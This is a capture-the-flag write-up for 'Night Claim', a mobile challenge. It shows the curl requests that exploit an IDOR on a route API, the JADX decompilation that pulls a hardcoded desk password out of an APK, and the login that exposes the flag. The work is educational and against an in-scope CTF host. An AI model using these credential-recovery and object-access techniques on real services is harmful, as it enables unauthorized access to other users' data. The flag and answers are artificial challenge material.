# Night Claim

## Metadata

- Event: SECPlayground Hackloween CTF 2026 (live competition)
- Category: Mobile
- Points: 10
- Difficulty: Easy
- Status: Solved
- Re-solve: n/a
- Target: `35.197.131.55:80` (in-scope CTF host)
- Main Writeup: `README.md`; `main.ipynb`: not applicable (solved via shell/`curl` + JADX; see inline commands)
- Files: [spgdrop-c01.apk](spgdrop-c01.apk), [APK extraction](apk_extracted/), [JADX output](jadx_out/), [DEX strings](dex_strings.txt), [UTF-16 string helper](utf16_strings.py), [byte-context helper](find_context.py)
- Skills Learned: Android APK decompilation, HTTP APIs, IDOR / broken object-level authorization

## Problem Summary

> “Alice's phone shows stop A-101 on van 4, but the night claim is on the depot desk. Find the claim and read its seal.”

The target hosted SPGDrop, a driver-phone web app for Alice. Its route API exposed the claim reference. The desk then required Alice's session, which came from credentials embedded in the challenge APK.

## Prediction
<!-- user fills this in -->

## Solve Log
<!-- user fills this in -->

## Key Idea

This was an IDOR, also called broken object-level authorization, at two points. First, the partner key for `/routes/mine` also allowed a lookup by predictable route ID at `/api/v1/routes/4`, which exposed claim `N-4401` without checking access to that linked claim. Second, the desk accepted Alice's valid session but did not check whether Alice owned the requested claim; the response says so directly.

The APK also held Alice's desk password as a Java constant. Decompiling the correct `c01` build revealed it. Shared strings about backups and request signing belonged to other build variants, so the decompiled control flow mattered more than the presence of those strings.

## Solution Walkthrough

### 1. Inspect the driver app and package files

The home page identified SPGDrop, Alice, van 4, and stop A-101. It linked to the APK and a package page. The served properties file named the route endpoint and partner key:

```sh
BASE='http://35.197.131.55'
curl -i "$BASE/"
curl -i "$BASE/package/"
curl -i "$BASE/package/assets/client.properties"
```

```properties
lane.api=/api/v1/routes/mine
lane.partner.key=yard-partner-4c2
```

### 2. Follow the partner API to the claim reference

A request without a partner header returned:

```sh
BASE='http://35.197.131.55'
curl -i "$BASE/api/v1/routes/mine"
```

```json
{"error":"A partner key is required."}
```

After trying plausible header names, `X-Partner-Key` worked. The route list returned Alice's route and the numeric route ID. Fetching that route exposed the claim ID and desk path:

```sh
BASE='http://35.197.131.55'
curl -i -H 'X-Partner-Key: yard-partner-4c2' \
  "$BASE/api/v1/routes/mine"
curl -i -H 'X-Partner-Key: yard-partner-4c2' \
  "$BASE/api/v1/routes/4"
```

The first response was:

```json
{"driver":"alice","note":"Leave at the side door.","route":"/api/v1/routes/4","stop":"A-101","van":"4"}
```

The route lookup returned:

```json
{"claim":"N-4401","desk":"/desk/claims/N-4401","van":"4"}
```

The route endpoint returned the claim reference, but the desk did not yet allow access. A request without Alice's session returned `401` with `The desk wants Alice's session.`

### 3. Reject the visible training credentials

`/desk/claims/night` displayed a login form pre-filled with `alice` and `lane-alice`, labeled “Training handset.” Posting those visible values failed with `401` and `That sign-in was not accepted.` They were decoys:

```sh
BASE='http://35.197.131.55'
curl -i "$BASE/desk/claims/N-4401"
curl -i "$BASE/desk/claims/night"
curl -i --data-urlencode 'user=alice' \
  --data-urlencode 'password=lane-alice' \
  "$BASE/login"
```

### 4. Decompile the APK for the c01 credentials

The APK was available at `/downloads/spgdrop-c01.apk`. It was 25,119 bytes, with SHA-256 `86e0b920aba5dcac782d0b5cddaec49334c75fc31ffff0b5b3951dea862d96d0`. APK files are ZIP archives. On macOS, install JADX with `brew install jadx` if needed. Unzip and decompile the APK:

```sh
BASE='http://35.197.131.55'
curl -fsS "$BASE/downloads/spgdrop-c01.apk" -o /tmp/spgdrop-c01.apk
shasum -a 256 /tmp/spgdrop-c01.apk
unzip -q /tmp/spgdrop-c01.apk -d /tmp/spgdrop-c01-extracted
jadx -d /tmp/spgdrop-c01-jadx /tmp/spgdrop-c01.apk
```

`BuildConfig.java` identified this build as `CODE = "c01"`, titled “The missing lantern.” `MainActivity.java` calls `addRequestDesk` only when the build code is `c03` or `c04`. The generic copy about APK and handset-backup evidence sits inside that inactive UI branch. The backup token and device-secret fields belong to the c03 branch; the Yard-signing path belongs to c04. Those code paths and strings belong to other Mobile challenges, Yard Release and Séance Clerk, not Night Claim.

The relevant c01 constants were in `com/hollowpost/client/Scenario.java`:

```java
public static final String DESK_PASSWORD = "lantern-veil-31";
public static final String DESK_USER = "alice";
```

The APK's own `client.properties` uses a `partner.prefix` value, which `Scenario.java` combines with `-4c2` to set `X-Partner-Key`. This is separate from the server's `/package/assets/client.properties`, which disclosed the complete key directly.

### 5. Log in and read the seal

The embedded credentials produced a `302` response and an HTTP-only `session` cookie. Store that cookie outside the challenge folder, then request the claim page:

```sh
BASE='http://35.197.131.55'
curl -i -c /tmp/night-claim.cookies \
  --data-urlencode 'user=alice' \
  --data-urlencode 'password=lantern-veil-31' \
  "$BASE/login"
curl -i -b /tmp/night-claim.cookies \
  "$BASE/desk/claims/N-4401"
```

The page title was `Claim N-4401`. Its body included:

```text
Night claim for van 4. Alice's session opened it. The desk did not check that this claim was hers.
<p class="seal" id="seal">mobile{Eq3Z1kY9Oj}</p>
```

The seal contained the confirmed flag.

## Exploit / Script

No standalone script was needed. The reproducible `curl` requests and JADX commands are shown above.

## Flag

`mobile{Eq3Z1kY9Oj}`

## Lessons Learned

- Check authorization for each object, not only whether a request has a valid API key or session. Both the route-to-claim lookup and the desk page lacked an ownership check.
- Treat secrets embedded in mobile apps as recoverable. JADX made the Java constants readable without running the app.
- Verify that a code path executes for the target build variant before following its strings. Shared APKs can contain clues for other challenges.

## References

- [BuildConfig.java](jadx_out/sources/com/hollowpost/client/BuildConfig.java)
- [MainActivity.java](jadx_out/sources/com/hollowpost/client/MainActivity.java)
- [Scenario.java](jadx_out/sources/com/hollowpost/client/Scenario.java)
